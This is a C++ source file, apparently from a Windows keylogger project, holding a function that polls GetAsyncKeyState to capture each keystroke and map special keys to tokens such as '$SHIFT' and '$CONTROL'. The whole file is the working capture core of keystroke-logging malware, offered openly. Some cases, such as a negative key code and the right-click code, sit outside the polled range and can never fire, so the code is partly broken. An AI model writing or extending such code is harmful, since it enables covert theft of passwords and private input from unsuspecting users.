#include <windows.h>
#include "Keylogger.hpp"

std::string GetKey() {
    for (int i=8; i <= 190; i++)
        if (GetAsyncKeyState(i) == -32767)
            switch(i) {
                case VK_SPACE: return " ";
                case VK_RETURN: return "\n";
                case -15682: return ".";
                case VK_SHIFT: return "$SHIFT";
                case VK_BACK: return "\b";
                case VK_RBUTTON: return "$RCLICK";
                case VK_CAPITAL: return "$CAPSLK";
                case VK_TAB: return "    ";
                case VK_UP: return "$UP_ARROW";
                case VK_DOWN: return "$DOWN_ARROW";
                case VK_LEFT: return "$LEFT_ARROW";
                case VK_RIGHT: return "$RIGHT_ARROW";
                case VK_CONTROL: return "$CONTROL";
                case VK_MENU: return "$ALT";
                default:
                    std::string s;
                    s += (char)i;
                    return s;
            }
    return "";
}
